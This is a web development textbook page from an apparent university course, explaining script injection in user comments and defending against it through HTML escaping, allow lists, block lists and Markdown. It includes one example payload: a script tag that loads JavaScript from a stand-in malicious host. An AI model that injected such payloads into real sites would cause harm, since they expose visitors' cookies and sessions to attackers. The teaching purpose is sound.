




	
	
		

	
	
		

	
	
		

	
	
		
		

	
	
		

	
	
		
		

	
	
		
		

	
	
		
		
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		

	
	
		

	
	
		
		

	
	
		
		
		
		

	
	
		
		
		

	
	
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		
		

	
	
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		
		

	
	
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		
		

	
	
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		
		

	
	
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		
		

	
	
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		
		

	
	
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		
		

	
	
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		
		

	
	
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		
		

	
	
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		
		

	
	
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		
		

	
	
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		
		

	
	
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		
		

	
	
		

	
	
		

	
	
		
		
		

	
	
		

	
	
		
		
		

	
	
		

	
	
		
		
		

	
	
		

	
	
		
		
		

	
	
		

	
	
		
		
		

	
	
		

	
	
		
		
		

	
	
		

	
	
		
		
		

	
	
		

	
	
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		

	
	
		
		
		

	
	
		

	
	
		

	
	
		
		
		

	
	
		

	
	
		
		
		

	
	
		

	
	
		
		
		

	
	
		

	
	
		
		
		

	
	
		

	
	
		
		
		

	
	
		

	
	
		
		
		

	
	
		

	
	
		
		
		

	
	
		

	
	
		
		
		
		
		
<!DOCTYPE html>
<html lang="en" dir="ltr">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="height=device-height, width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <meta name="generator" content="Hugo 0.117.0">
    <meta name="generator" content="Relearn 5.18.0">
    <meta name="description" content="CIS 526 Textbook">
    <meta name="author" content="Nathan Bean">
    <title>Script Injection :: CIS 526 Textbook</title>
    <link href="https://ksu-cs-textbooks.github.io/cis526/06-dynamic-web-servers/11-script-injection/index.html" rel="canonical" type="text/html" title="Script Injection :: CIS 526 Textbook">
    <link href="https://ksu-cs-textbooks.github.io/cis526/06-dynamic-web-servers/11-script-injection/index.xml" rel="alternate" type="application/rss+xml" title="Script Injection :: CIS 526 Textbook">
    <link href="https://ksu-cs-textbooks.github.io/cis526/06-dynamic-web-servers/11-script-injection/index.print.html" rel="alternate" type="text/html" title="Script Injection :: CIS 526 Textbook">
    <link href="https://ksu-cs-textbooks.github.io/cis526/06-dynamic-web-servers/11-script-injection/tele.html" rel="alternate" type="text/html" title="Script Injection :: CIS 526 Textbook">
    <!-- https://github.com/filamentgroup/loadCSS/blob/master/README.md#how-to-use -->
    <link href="https://ksu-cs-textbooks.github.io/cis526/css/fontawesome-all.min.css?1705188819" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="https://ksu-cs-textbooks.github.io/cis526/css/fontawesome-all.min.css?1705188819" rel="stylesheet"></noscript>
    <link href="https://ksu-cs-textbooks.github.io/cis526/css/nucleus.css?1705188819" rel="stylesheet">
    <link href="https://ksu-cs-textbooks.github.io/cis526/css/auto-complete.css?1705188819" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="https://ksu-cs-textbooks.github.io/cis526/css/auto-complete.css?1705188819" rel="stylesheet"></noscript>
    <link href="https://ksu-cs-textbooks.github.io/cis526/css/perfect-scrollbar.min.css?1705188819" rel="stylesheet">
    <link href="https://ksu-cs-textbooks.github.io/cis526/css/fonts.css?1705188819" rel="stylesheet" media="print" onload="this.media='all';this.onload=null;"><noscript><link href="https://ksu-cs-textbooks.github.io/cis526/css/fonts.css?1705188819" rel="stylesheet"></noscript>
    <link href="https://ksu-cs-textbooks.github.io/cis526/css/theme.css?1705188819" rel="stylesheet">
    <link href="https://ksu-cs-textbooks.github.io/cis526/css/theme-auto.css?1705188819" rel="stylesheet" id="variant-style">
    <link href="https://ksu-cs-textbooks.github.io/cis526/css/variant.css?1705188819" rel="stylesheet">
    <link href="https://ksu-cs-textbooks.github.io/cis526/css/print.css?1705188819" rel="stylesheet" media="print">
    <link href="https://ksu-cs-textbooks.github.io/cis526/css/ie.css?1705188819" rel="stylesheet">
    <script src="https://ksu-cs-textbooks.github.io/cis526/js/url.js?1705188819"></script>
    <script src="https://ksu-cs-textbooks.github.io/cis526/js/variant.js?1705188819"></script>
    <script>
      // hack to let hugo tell us how to get to the root when using relativeURLs, it needs to be called *url= for it to do its magic:
      // https://github.com/gohugoio/hugo/blob/145b3fcce35fbac25c7033c91c1b7ae6d1179da8/transform/urlreplacers/absurlreplacer.go#L72
      window.index_js_url="https://ksu-cs-textbooks.github.io/cis526/index.search.js";
      var root_url="https://ksu-cs-textbooks.github.io/cis526/";
      var baseUri=root_url.replace(/\/$/, '');
      // translations
      window.T_Copy_to_clipboard = 'Copy to clipboard';
      window.T_Copied_to_clipboard = 'Copied to clipboard!';
      window.T_Copy_link_to_clipboard = 'Copy link to clipboard';
      window.T_Link_copied_to_clipboard = 'Copied link to clipboard!';
      window.T_No_results_found = 'No results found for \u0022{0}\u0022';
      window.T_N_results_found = '{1} results found for \u0022{0}\u0022';
      // some further base stuff
      var baseUriFull='https:\/\/ksu-cs-textbooks.github.io\/cis526/';
      window.variants && variants.init( [ 'auto', 'light-theme', 'dark-theme' ] );
    </script>
    
    <link href="https://ksu-cs-textbooks.github.io/cis526/css/custom.css?1705188819" rel="stylesheet">

  </head>
  <body class="mobile-support embed disableInlineCopyToClipboard" data-url="https://ksu-cs-textbooks.github.io/cis526/06-dynamic-web-servers/11-script-injection/embed.html">
    <div id="body" class="default-animation">
      
      
      
      <main id="body-inner" class="highlightable default" tabindex="-1">
        <div class="flex-block-wrapper">
          <article class="default">
    
    
    
<p>Whenever we render content created by users, we open the door to <em>script injection</em>, a kind of attack where a malicious user adds script tags to the content they are posting.  Consider this form:</p>
<div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">form</span> <span style="color:#a6e22e">action</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;post&#34;</span>&gt;
</span></span><span style="display:flex;"><span>   &lt;<span style="color:#f92672">label</span> <span style="color:#a6e22e">for</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;comment&#34;</span>&gt;
</span></span><span style="display:flex;"><span>      &lt;<span style="color:#f92672">textarea</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;comment&#34;</span>&gt;&lt;/<span style="color:#f92672">textarea</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">label</span>&gt;
</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;submit&#34;</span>/&gt;
</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">form</span>&gt;</span></span></code></pre></div><p>The intent is to allow the user to post comments on the page.  But a malicious user could enter something like:</p>
<div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>What an awesome site &lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://malic.ous/dangerous-script.js&#34;</span>&gt;&lt;/<span style="color:#f92672">script</span>&gt;</span></span></code></pre></div><p>If we concatenate this string directly into the webpage, we will serve the <code>&lt;script&gt;</code> tag the user included, which means that <em>dangerous-script.js</em> will run on our page!  That means it can potentially access our site&rsquo;s cookies, and make AJAX requests from our site.  This script will run on the page for <em>all</em> visitors!</p>
<p>This attack is known as <a href="https://www.softwaretestinghelp.com/javascript-injection-tutorial/" target="_blank">script injection</a>
, and is something you <strong>MUST</strong> prevent. So how can we prevent it?  There are several strategies:</p>
<ol>
<li>HTML Escaping</li>
<li>Block Lists</li>
<li>Allow Lists</li>
<li>Markdown or other Markup Languages</li>
</ol>
<h3 id="html-escaping">HTML Escaping</h3>
<p>The simplest is to &ldquo;escape&rdquo; html tags by replacing the <code>&lt;</code> and <code>&gt;</code> characters with their html code equivalents, <code>&amp;lt;</code> (less than symbol) and <code>&amp;gt;</code> (greater than symbol).  By replacing the opening and closing brackets with the equivalent HTML code, the browser will render the tags as ordinary strings, instead of as HTML.  Thus, the above example will render on the page as:</p>
<blockquote>
<p>What an awesome site &lt;script src=&ldquo;<a href="http://malic.ous/dangerous-script.js%22&amp;gt;&amp;lt;/script" target="_blank">http://malic.ous/dangerous-script.js"&gt;&lt;/script</a>
&gt;</p>
</blockquote>
<p>This can be accomplished in JavaScript with the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/replace" target="_blank">String.prototype.replace()</a>
 method:</p>
<div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">sanitizedHtmlString</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">htmlString</span>.<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/&lt;/g</span>, <span style="color:#e6db74">&#39;&amp;lt;&#39;</span>).<span style="color:#a6e22e">replace</span>(<span style="color:#e6db74">/&gt;/g</span>, <span style="color:#e6db74">&#39;&amp;gt&#39;</span>);</span></span></code></pre></div><p>The <code>replace()</code> method takes either a regular expression or string to search for - and a string to replace the occurrences with.  Here we use regular expressions with the global flag, so that <em>all</em> occurrences will be replaced.  We also take advantage of the fact that it returns the modified string to do <a href="https://en.wikipedia.org/wiki/Method_chaining" target="_blank">method chaining</a>
, invoking a second <code>replace()</code> call on the string returned from the first call.</p>
<p>The downside to this approach is that <em>all</em> html in the string is reinterpreted as plain text.  This means our comments won&rsquo;t support HTML codes like <code>&lt;b&gt;</code> and <code>&lt;i&gt;</code>, limiting the ability of users to customize their responses.</p>
<h3 id="allow-lists">Allow Lists</h3>
<p>Allow lists (also called &ldquo;whitelists&rdquo;) are a technique to allow only certain tags to be embedded into the page.  This approach is more involved, as we must first <em>parse</em> the HTML string the same way a browser would to determine what tags it contains, and then remove any tags that don&rsquo;t appear in our allow list.</p>
<p>Instead of writing your own code to do this, it is common practice to use a well-maintained and tested open-source library.  For example, the NPM package <a href="https://www.npmjs.com/package/sanitize-html" target="_blank">sanitize-html</a>
 provides this ability.</p>
<h3 id="block-lists">Block Lists</h3>
<p>Block lists (also called &ldquo;blacklists&rdquo;) are a similar technique, but rather than specifying a list of <em>allowed</em> tags, you specify a list of <em>disallowed</em> tags.  These are then stripped from html strings.  This approach is slightly less robust, as new tags are added to the HTML standard will need to be evaluated and potentially added to the block list.</p>
<h3 id="markdown-or-other-markup-languages">Markdown or other Markup Languages</h3>
<p>A final option is to have users write their contributions using Markdown or another markup language which is transformed <em>into</em> JavaScript.  Markdown (used by GitHub and many other websites) is probably the best-known of these, and provides equivalents to bold, italic, headings, links, and images:</p>
<div class="wrap-code highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-md" data-lang="md"><span style="display:flex;"><span># This is transformed into a h1 element 
</span></span><span style="display:flex;"><span><span style="color:#75715e">## This is transformed into a h2 element
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">&gt; </span><span style="font-style:italic">This is transformed into a blockquote 
</span></span></span><span style="display:flex;"><span><span style="font-style:italic"></span>_this is italicized_ <span style="font-style:italic">*as is this*</span>
</span></span><span style="display:flex;"><span><span style="font-weight:bold">__this is bold__</span> <span style="font-weight:bold">**as is this**</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">*</span> this
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">*</span> is
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">*</span> an 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">*</span> unordered 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">*</span> list
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">1.</span> this
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">2.</span> is 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">3.</span> a 
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">4.</span> numbered
</span></span><span style="display:flex;"><span>5. list</span></span></code></pre></div><p>As it does not have conversions for <code>&lt;script&gt;</code> and other dangerous tags, HTML generated from it is relatively &ldquo;safe&rdquo; (it is still necessary to escape HTML in the original markup string though).</p>
<p>As with allow/block lists, Markdown and the like are usually processed with an outside library, like <a href="https://www.npmjs.com/package/markdown" target="_blank">markdown-js</a>
.  There are similar libraries for most modern programming languages.</p>

            <footer class="footline">

            </footer>
          </article>
        </div>
      </main>
    </div>
    
    
    
    <script src="https://ksu-cs-textbooks.github.io/cis526/js/clipboard.min.js?1705188820" defer></script>
    <script src="https://ksu-cs-textbooks.github.io/cis526/js/perfect-scrollbar.min.js?1705188820" defer></script>
    <script src="https://ksu-cs-textbooks.github.io/cis526/js/theme.js?1705188820" defer></script>
  </body>
</html>
